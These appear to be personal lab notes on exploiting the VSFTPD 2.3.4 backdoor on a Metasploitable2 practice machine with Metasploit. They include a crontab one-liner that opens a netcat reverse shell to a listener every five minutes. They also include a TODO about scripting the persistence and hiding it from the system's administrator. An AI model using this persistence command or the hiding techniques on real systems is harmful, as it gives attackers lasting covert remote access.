VSFTPD 2.3.4

1) Vulnerable to a backdor lcoated on the installer (.tar) of the protocol
2) Using metasploit module we obtain a shell than upgraded to meterpeter just for QoF
3) Full usable TTY
4) Wanna use a cronjob to create a persistente backdoor using cronjob

THIS OVERRIDE OTHER ENTRIES

(crontab -l 2>/dev/null; echo "*/5 * * * * nc -e /bin/bash 192.168.41.128 50032") | crontab -


5) Open the listener to the specified port and wait MAX 5min and get the shell.......COOL!


I was looking for method to hide ourself and our cronjob and after a short period of time on metasplotaible2 terminal 
on root user appear the message "You got a new email in /var/mail/root" with a message that they discovered our cronjobs

Good thing we can move for what I was looking for



TODO

make all of this scriptable (no override entry) and find a way to hide somehow
